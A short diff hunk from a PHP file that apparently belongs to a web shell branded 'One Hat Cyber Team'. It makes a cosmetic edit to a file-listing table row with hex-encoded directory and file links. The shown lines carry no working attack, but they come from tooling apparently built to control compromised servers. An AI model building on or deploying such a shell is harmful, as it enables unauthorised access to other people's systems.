@@ -635,7 +635,7 @@ One Hat Cyber Team</a></span></div>
 							:
 								$j .= '<tr class="r">
 							<td>
-								<i class="fa fa-fw fa-file"></i>&thinsp;
+								<i class="fa fa-fw fa-file"></i>
 								<a class="ajx" href="?d='.hex($e).'&s='.hex($c).'">'.$c.'</a>
 							</td>
 							<td class="x">
